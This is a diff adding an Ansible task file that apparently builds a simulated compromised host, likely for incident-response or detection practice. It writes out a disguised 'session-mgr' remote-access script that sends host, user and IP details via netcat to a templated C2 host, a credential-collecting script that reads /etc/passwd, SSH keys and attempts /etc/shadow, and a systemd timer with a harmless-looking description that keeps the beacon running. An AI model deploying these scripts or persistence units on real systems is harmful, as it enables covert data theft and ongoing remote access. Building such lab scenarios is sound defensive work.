@@ -1,0 +1,137 @@
+---
+- name: Install netcat
+  apt:
+    name: netcat-openbsd
+    state: present
+    update_cache: yes
+
+- name: Ensure session directory exists
+  file:
+    path: "{{ session_dir }}"
+    state: directory
+    owner: root
+    group: root
+    mode: "0755"
+
+- name: Place the dropped RAT script
+  copy:
+    dest: "{{ rat_script }}"
+    owner: root
+    group: root
+    mode: "0755"
+    content: |
+      #!/bin/bash
+      # session-mgr -- system session management
+      C2="{{ c2_host }}"
+      PORT="{{ c2_port }}"
+      LOG="{{ rat_log }}"
+      mkdir -p "$(dirname "$LOG")"
+      echo "$(date -Is) CONNECT ${C2}:${PORT} host=$(hostname)" >> "$LOG"
+      {
+        echo "=== RAT $(date -Is) ==="
+        echo "host=$(hostname)"
+        echo "ip=$(hostname -I | awk '{print $1}')"
+        echo "user=$(whoami)"
+        echo "uptime=$(uptime -p)"
+        echo "procs=$(ps aux | wc -l)"
+      } | nc -w 10 "$C2" "$PORT" 2>/dev/null || true
+      echo "$(date -Is) DONE" >> "$LOG"
+
+- name: Place the dropped stealer script
+  copy:
+    dest: "{{ session_dir }}/stealer.sh"
+    owner: root
+    group: root
+    mode: "0755"
+    content: |
+      #!/bin/bash
+      # sys-collect -- one-shot credential collector
+      echo "=== COLLECT $(date -Is) host=$(hostname) ==="
+      echo "--- /etc/passwd ---"
+      cat /etc/passwd 2>/dev/null || true
+      echo "--- home directories ---"
+      ls -la /home/ 2>/dev/null || true
+      for d in /home/*/; do
+        echo "--- contents: $d ---"
+        ls -la "$d" 2>/dev/null || true
+      done
+      echo "--- SSH public keys ---"
+      find /home -name '*.pub' 2>/dev/null -exec cat {} \;
+      echo "--- /etc/shadow (attempt) ---"
+      cat /etc/shadow 2>/dev/null || echo "(permission denied)"
+      echo "--- END ---"
+
+- name: Seed stealer output (simulates prior one-shot execution)
+  copy:
+    dest: "{{ session_dir }}/stealer.out"
+    owner: root
+    group: root
+    mode: "0600"
+    content: |
+      === COLLECT {{ ansible_date_time.iso8601 }} host={{ ansible_hostname }} ===
+      --- /etc/passwd ---
+      root:x:0:0:root:/root:/bin/bash
+      {{ victim_user }}:x:1001:1001:,,,:/home/{{ victim_user }}:/bin/bash
+      --- home directories ---
+      drwxr-xr-x  3 root root  4096 {{ ansible_date_time.date }} /home/
+      drwxr-xr-x 12 {{ victim_user }} {{ victim_user }} 4096 {{ ansible_date_time.date }} /home/{{ victim_user }}/
+      --- contents: /home/{{ victim_user }}/ ---
+      -rw-r--r-- 1 {{ victim_user }} {{ victim_user }}  512 {{ ansible_date_time.date }} invoice_march.txt
+      -rw-r--r-- 1 {{ victim_user }} {{ victim_user }}  389 {{ ansible_date_time.date }} meeting_notes.txt
+      --- SSH public keys ---
+      --- /etc/shadow (attempt) ---
+      (permission denied)
+      --- END ---
+
+- name: Seed RAT connection log
+  copy:
+    dest: "{{ rat_log }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      {{ ansible_date_time.iso8601 }} CONNECT {{ c2_host }}:{{ c2_port }} host={{ ansible_hostname }}
+      {{ ansible_date_time.iso8601 }} DONE
+
+- name: Create RAT systemd service
+  copy:
+    dest: "/etc/systemd/system/{{ rat_service_unit }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=System Session Manager
+      After=network-online.target
+      Wants=network-online.target
+
+      [Service]
+      Type=oneshot
+      ExecStart={{ rat_script }}
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Create RAT systemd timer
+  copy:
+    dest: "/etc/systemd/system/{{ rat_timer_unit }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Periodic session management
+
+      [Timer]
+      OnCalendar={{ rat_schedule }}
+      Persistent=true
+
+      [Install]
+      WantedBy=timers.target
+
+- name: Enable and start RAT timer
+  systemd:
+    name: "{{ rat_timer_unit }}"
+    enabled: yes
+    state: started
+    daemon_reload: yes
